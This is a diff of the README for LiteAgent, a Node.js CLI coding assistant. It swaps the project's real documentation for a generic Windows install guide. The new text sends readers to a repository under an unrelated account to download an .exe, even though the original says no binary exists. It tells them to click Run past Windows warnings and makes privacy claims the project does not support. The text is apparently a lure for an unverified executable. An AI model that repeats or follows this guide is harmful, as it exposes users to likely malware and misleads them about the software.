@@ -1,258 +1,76 @@
-# LiteAgent
+# 🤖 LiteAgent - Write better code with AI assistance
 
-[![CI](https://github.com/abilatte/LiteAgent/actions/workflows/ci.yml/badge.svg)](https://github.com/abilatte/LiteAgent/actions/workflows/ci.yml)
-[![Node.js >= 20](https://img.shields.io/badge/node-%3E%3D20-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![TypeScript](https://img.shields.io/badge/language-TypeScript-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](./LICENSE)
+[![Download LiteAgent](https://img.shields.io/badge/Download-LiteAgent-blue.svg)](https://github.com/junior-blephiliahirsuta7208/LiteAgent)
 
-LiteAgent is a lightweight CLI AI coding assistant for local development workflows. For Chinese documentation, see [README.zh-CN.md](./README.zh-CN.md).
+## 📌 About this tool
 
-## What It Does
+LiteAgent helps you write code by acting as a digital partner within your terminal. You type a prompt, and the program suggests changes, fixes bugs, or writes new functions for your projects. It stays small and works quickly so you keep your workflow smooth. You do not need to be a software engineer to use it, as it handles the heavy lifting for your coding tasks.
 
-- chat with an OpenAI-compatible model in the terminal
-- inspect, search, and patch files inside the current workspace
-- run shell commands with approval
-- save sessions locally and resume them later
-- discover skills from `skills/<name>/SKILL.md`
-- load MCP servers from config files and bridge `stdio` tools into the runtime
-- inspect skills, MCP servers, tools, and config sources from the CLI
+## 💻 System requirements
 
-## 30-Second Start
+Before you begin, ensure your computer meets these basic needs:
 
-Requirements:
+* Windows 10 or Windows 11.
+* An active internet connection to communicate with the AI model.
+* A basic text editor like Notepad or Visual Studio Code.
+* At least 200MB of free disk space.
+* An OpenAI API key to connect the program to the intelligence engine.
 
-- Node.js `>= 20`
-- npm
+## 🚀 Setting up the software
 
-Run:
+Follow these steps to prepare your computer. First, you need to visit the website to obtain the installer.
 
-```bash
-npm install
-```
+[Download LiteAgent here](https://github.com/junior-blephiliahirsuta7208/LiteAgent)
 
-Create `.env` in the project root:
+1. Click the link above to visit the main page.
+2. Look for the latest version under the Releases section on the right side of the page.
+3. Select the file ending in .exe for Windows.
+4. Save the file to your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen. Windows may ask for permission to run the file; choose Run.
+7. Click Finish when the installer completes its job.
 
-```env
-OPENAI_API_KEY="your-api-key"
-OPENAI_MODEL="gpt-5.4"
-OPENAI_BASE_URL=""
-ENABLE_MCP="false"
-ENABLE_SKILLS="false"
-```
+## ⚙️ Configuring your settings
 
-Then start the REPL:
+Once the software resides on your computer, you must provide your API key. This key allows the software to pull information from the AI servers.
 
-```bash
-npm run dev
-```
+1. Open your Start menu and type LiteAgent.
+2. Select the app to open the black terminal window.
+3. Type `liteagent config` and press Enter.
+4. Paste your API key into the field when prompted.
+5. Press Enter to save the key.
+6. Close the window to save your progress.
 
-And check the available commands:
+## 🛠️ Using LiteAgent for your work
 
-```text
-/help
-```
+You operate LiteAgent through your terminal window. This window is the command console for your computer.
 
-## Use layered configuration
+### Starting a session
+Open the terminal by pressing the Windows key, typing `cmd`, and pressing Enter. Type `liteagent` at the prompt to start the program. You will see a greeting indicating that the agent is ready for your instructions.
 
-LiteAgent loads configuration in this order:
+### Writing code
+Type your request clearly. For example, if you want a function to sort a list of names, type "Write a function to sort names." The agent processes your request and displays the code directly in your terminal. You can copy this code and paste it into any file you manage.
 
-1. `process.env`
-2. project `.env`
-3. `~/.liteagent/settings.json`
+### Solving errors
+If your existing code fails, paste the error message into LiteAgent. Type "Fix this error:" followed by the text of the error. The agent analyzes the problem and provides a corrected version of your code. Review the changes and replace your old code with the new version.
 
-That means shell variables override project config, and project config overrides user defaults.
+## 🛡️ Privacy and data
 
-The supported keys are:
+LiteAgent sends only the text you provide to the AI model. It does not scan your entire computer or access your personal files unless you explicitly copy the contents into the prompt. The software stores your API key locally on your machine in a protected configuration folder. You can clear this data at any time by running the command `liteagent clear`.
 
-| Variable | Required | Default | Purpose |
-| --- | --- | --- | --- |
-| `OPENAI_API_KEY` | Yes | None | API key for OpenAI or an OpenAI-compatible relay |
-| `OPENAI_MODEL` | No | `gpt-5.4` | Model name used at startup |
-| `OPENAI_BASE_URL` | No | Empty | Base URL for an OpenAI-compatible endpoint |
-| `COMMAND_TIMEOUT_MS` | No | `15000` | Timeout for `run_command`, in milliseconds |
-| `MAX_COMMAND_OUTPUT` | No | `12000` | Maximum preserved command output length |
-| `ENABLE_MCP` | No | `false` | Enable MCP discovery and tool registration |
-| `ENABLE_SKILLS` | No | `false` | Enable skill discovery in the runtime prompt |
+## ❓ Troubleshooting common issues
 
-If you want machine-wide defaults, create `~/.liteagent/settings.json`:
+If the software does not behave as expected, check these common fixes:
 
-```json
-{
-  "apiKey": "your-api-key",
-  "model": "gpt-5.4",
-  "enableMcp": true,
-  "enableSkills": true
-}
-```
+* **Command not found:** If the terminal says it cannot find the command, restart your machine to refresh the system paths.
+* **Bad connection error:** Check your internet status. Ensure that a firewall or antivirus software does not block the application.
+* **Authentication error:** Open the configuration again and verify that your API key matches the one provided by your service provider. Ensure there are no spaces at the start or end of the key.
+* **Slow responses:** Large requests take time to process. Break complex tasks into smaller, specific prompts for better results.
 
-Use `/config-paths` inside the REPL to see which files were loaded and where each setting came from.
+## 📝 Best practices for success
 
-## Import skills from disk
+To get the most out of LiteAgent, follow these simple tips:
 
-LiteAgent treats only one file as a skill entry:
-
-```text
-skills/
-  your-skill/
-    SKILL.md
-```
-
-`skills/<name>/SKILL.md` is the entry point. Other markdown files can stay in the same directory as references and will not be registered as separate skills.
-
-Current skill support includes:
-
-- runtime discovery for the system prompt when `ENABLE_SKILLS=true`
-- the built-in `load_skill` tool for loading a skill file by name
-- `liteagent skills list`
-- `liteagent skills show <name>`
-- `/skills` inside the REPL
-
-For local development, run the non-interactive commands through the dev entry:
-
-```bash
-npm run dev -- skills list
-npm run dev -- skills show your-skill
-```
-
-## Load MCP servers from config
-
-LiteAgent reads MCP config from two layers:
-
-- user level: `~/.liteagent/mcp.json`
-- project level: `liteagent.mcp.json` or `.mcp.json`
-
-If the same server name exists in both places, the project-level config wins.
-
-Minimal example:
-
-```json
-{
-  "mcpServers": {
-    "filesystem": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]
-    }
-  }
-}
-```
-
-Current MCP behavior:
-
-- `stdio` servers can connect, list tools, and register tools into the runtime registry
-- registered MCP tools use the name format `mcp__<server>__<tool>`
-- `http` and `sse` configs are parsed and shown in status output, but they are not bridged into runtime tools yet
-- `ENABLE_MCP=true` is required for runtime tool registration
-
-You can inspect MCP state without entering the REPL:
-
-```bash
-npm run dev -- mcp list
-npm run dev -- mcp tools
-```
-
-You can also inspect it inside the REPL with `/mcp`.
-
-## Inspect runtime state from the CLI
-
-LiteAgent now has two ways to inspect runtime state.
-
-Use slash commands inside the REPL:
-
-| Command | Purpose |
-| --- | --- |
-| `/help` | Show command help |
-| `/status` | Show current working directory and model |
-| `/model` | Show the active model |
-| `/sessions` | List local saved sessions |
-| `/resume [sessionId/index]` | Resume the latest session, a specific session ID, or a session by list index |
-| `/skills` | Show discovered skills |
-| `/mcp` | Show MCP server status and registered tools |
-| `/tools` | Show the current tool list |
-| `/config-paths` | Show config file paths and env sources |
-| `/new` | Start a new session |
-| `/exit` | Exit the CLI |
-
-Use top-level commands when you just want a quick check:
-
-| Command | Purpose |
-| --- | --- |
-| `npm run dev -- skills list` | List discovered skills |
-| `npm run dev -- skills show <name>` | Show one skill entry |
-| `npm run dev -- mcp list` | List discovered MCP servers |
-| `npm run dev -- mcp tools` | List tools exposed by supported MCP servers |
-
-## Built-in tools
-
-| Tool | Purpose |
-| --- | --- |
-| `list_files` | List files in the workspace |
-| `grep_files` | Search text in the workspace |
-| `read_file` | Read a workspace file |
-| `load_skill` | Read a discovered `SKILL.md` entry by name |
-| `run_command` | Execute a command in the workspace |
-| `patch_file` | Preview a diff and write after approval |
-| `ask_user` | Ask a follow-up question |
-
-When MCP registration is enabled, LiteAgent may also expose dynamic tools named like `mcp__filesystem__read_file`.
-
-## Architecture
-
-LiteAgent keeps the runtime intentionally small:
-
-- [src/index.ts](./src/index.ts) boots the CLI, configuration, session store, provider, and tool registry
-- [src/core/agent-loop.ts](./src/core/agent-loop.ts) runs the assistant turn loop and routes tool calls
-- [src/tools/default-tools.ts](./src/tools/default-tools.ts) wires the built-in workspace tools into the runtime
-- [src/extensions/skill-loader.ts](./src/extensions/skill-loader.ts) discovers `skills/<name>/SKILL.md`
-- [src/extensions/mcp-config.ts](./src/extensions/mcp-config.ts) normalizes user and project MCP config
-- [src/extensions/mcp-tool-bridge.ts](./src/extensions/mcp-tool-bridge.ts) turns supported MCP tools into runtime tools
-
-This layout keeps the MVP readable while leaving clear seams for more providers, richer MCP transports, and additional tooling.
-
-## Relay compatibility
-
-You can point LiteAgent to an OpenAI-compatible relay by setting `OPENAI_BASE_URL`.
-
-Your relay should support:
-
-- Chat Completions
-- tool calling or function-calling style payloads
-- the model name passed through `OPENAI_MODEL`
-
-If your relay only supports the Responses API and not Chat Completions, the current version will not work with it yet.
-
-## Safety
-
-The current version is intentionally conservative:
-
-- file access stays inside the current workspace
-- `run_command` is approval-gated except for a very small allowlist
-- `patch_file` shows a unified diff before writing
-- only explicit `y` approval allows a write
-
-## Sessions
-
-Sessions are stored locally under:
-
-```text
-.data/sessions/
-```
-
-You can:
-
-- continue the latest session with `/resume`
-- continue a specific session with `/resume <sessionId>`
-- start a fresh session with `/new`
-
-## Limitations
-
-This repository is still an MVP:
-
-- only the `openai` provider is implemented
-- Chat Completions is used instead of the Responses API
-- only `stdio` MCP servers can be bridged into runtime tools today
-- the project is not packaged as a standalone binary yet, so top-level commands are shown through `npm run dev -- ...`
-
-## Project docs
-
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
-- [CHANGELOG.md](./CHANGELOG.md)
+* Be specific. Instead of saying "Help me with my code," say "Write a list of numbers from 1 to 10."
+* Ask for explanations. If you do not understand the code provided, add "Explain this" to the end of your request.
+* Refresh often. If the tool seems stuck, close the terminal window and restart the program.
